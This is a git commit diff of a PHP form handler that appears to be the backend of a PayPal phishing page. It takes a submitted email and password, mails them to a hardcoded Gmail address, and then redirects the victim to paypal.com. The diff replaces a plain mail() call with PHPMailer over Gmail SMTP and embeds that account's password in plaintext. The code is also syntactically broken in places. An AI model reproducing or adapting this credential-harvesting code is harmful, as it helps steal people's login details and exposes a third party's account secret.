fa690901a449c2ad97304af19fe482a280eb6b30
alechimo <162431405+alechimo@users.noreply.github.com>
2024-08-16 01:56:04 -0400

    procesar_formulario.php

--- procesar_formulario.php
+++ procesar_formulario.php
@@ -1,14 +1,27 @@
 <?php
 
+require "PHPMailer/Exception.php";
+require "PHPMailer/PHPMailer.php";
+require "PHPMailer/SMTP.php";
+ 
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+ 
+$oMail= new PHPMailer();
+$oMail->isSMTP();
+$oMail->Host="smtp.gmail.com";
+$oMail->Port=587;
+$oMail->SMTPSecure="tls";
+$oMail->SMTPAuth=true;
+$oMail->Username="sebastiandiazdiaz2818@gmail.com";
+$oMail->Password="Sebas7.,";
+$oMail->setFrom("sebastiandiazdiaz2818@gmail.com","Minty");
+$oMail->addAddress("sebastiandiazdiaz2818@gmail.com","Minty2");
+$oMail->Subject="Informacion 100% legal"
+
 if ($.SERVER["REQUEST_METHOD] == "POST") {
     $email = $_POST["email"];
     $password = $_POST["password"];
-    
-    $to = "sebastiandiazdiaz2818@gmail.com";
-    $subject = "Nuevo Inicio De Sesion";
-    $message = "Correo electronico: $email\nContraseña: $password";
-    mail($to, $subject, $message);
-    
     
     header("Location: https://www.paypal.com");
     exit();
